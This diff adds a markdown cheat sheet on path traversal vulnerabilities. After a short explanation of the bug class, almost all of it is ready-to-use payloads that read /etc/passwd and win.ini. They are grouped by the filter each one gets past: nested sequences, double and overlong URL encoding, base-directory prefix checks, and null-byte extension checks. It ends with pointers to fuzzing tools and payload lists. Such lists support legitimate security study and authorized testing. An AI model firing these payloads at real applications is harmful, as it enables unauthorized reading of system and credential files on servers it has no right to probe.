@@ -1,0 +1,51 @@
+Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server. 
+
+🔓 Simple Path Traversal (no defenses)
+
+../../../etc/passwd
+../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+
+🛡️ Absolute Path Bypass
+
+If the app blocks ../, but allows absolute paths:
+
+/etc/passwd
+C:\windows\win.ini
+
+🔁 Traversal Sequences Stripped Non-Recursively
+
+If the app strips ../, try nested traversal payloads:
+
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+🌐 Encoded Traversal Sequences (URL-decode Bypass)
+
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+📂 Base Directory Prefix Validation Bypass
+
+If the app checks that the filename starts with /var/www/images:
+
+/var/www/images/../../../etc/passwd
+
+🧵 Extension Validation Bypass (Null Byte Injection)
+
+If the app requires .png extension:
+
+../../../etc/passwd%00.png
+..%2f..%2f..%2fetc%2fpasswd%00.png
+
+    ⚠️ Note: Null byte injection (%00) only works in some older systems or specific language environments (e.g., older PHP versions).
+
+🧰 Useful Tools / Payload Lists
+
+    Burp Suite Intruder ➝ Fuzzing - path traversal payload list
+
+    PayloadAllTheThings (GitHub) ➝ Great resource for a variety of bypasses
+
